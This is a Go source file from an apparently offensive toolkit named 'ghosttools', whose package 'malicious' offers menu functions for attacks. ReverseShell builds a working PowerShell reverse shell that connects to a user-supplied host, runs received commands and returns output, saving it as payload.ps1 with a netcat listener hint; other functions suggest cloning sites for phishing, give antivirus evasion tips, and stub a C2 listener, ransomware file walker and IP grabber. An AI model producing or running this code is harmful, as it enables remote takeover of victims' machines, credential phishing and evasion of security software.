package malicious

import (
	"fmt"
	"os"
	"path/filepath"

	"ghosttools/internal/ui"
)

func ReverseShell() {
	ui.Cyan("enter LHOST:")
	var lhost string
	fmt.Scanln(&lhost)
	ui.Cyan("enter LPORT:")
	var lport string
	fmt.Scanln(&lport)

	ps := fmt.Sprintf(`$c=New-Object Net.Sockets.TCPClient('%s',%s);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()`, lhost, lport)

	os.MkdirAll("ghosttools_revshell", 0755)
	os.WriteFile(filepath.Join("ghosttools_revshell", "payload.ps1"), []byte(ps), 0644)
	ui.Green("saved to ghosttools_revshell/payload.ps1")
	ui.Cyan("listen: nc -lvnp " + lport)
}

func PhishingPage() {
	ui.Cyan("enter target url:")
	var url string
	fmt.Scanln(&url)
	ui.Yellow("clone with httrack:")
	fmt.Println("  httrack " + url)
}

func Persistence() {
	ui.Yellow("see RAT builder for persistence — this entry is a placeholder")
}

func AVEvasion() {
	ui.Cyan("evasion tips:")
	fmt.Println("  go build -ldflags \"-s -w\"")
	fmt.Println("  upx --best binary.exe")
	fmt.Println("  avoid CreateRemoteThread")
	fmt.Println("  encrypt strings at runtime")
}

func C2Server() {
	ui.Cyan("enter port (default 4444):")
	var p string
	fmt.Scanln(&p)
	if p == "" {
		p = "4444"
	}
	fmt.Println(ui.Green("run on your server:"))
	fmt.Printf("  nc -lvnp %s\n", p)
}

func Botnet() {
	ui.Yellow("see C2Server — persistence required")
}

func RansomSim() {
	ui.Cyan("enter target dir:")
	var d string
	fmt.Scanln(&d)
	ui.Yellow("SIMULATION ONLY")
	filepath.Walk(d, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}
		fmt.Println("  would encrypt: " + path)
		return nil
	})
}

func IPGrabber() {
	ui.Cyan("enter webhook URL:")
	var w string
	fmt.Scanln(&w)
	ui.Cyan("enter port (default 8080):")
	var p string
	fmt.Scanln(&p)
	if p == "" {
		p = "8080"
	}
	fmt.Printf("  visit http://YOUR_IP:%s to log to webhook\n", p)
}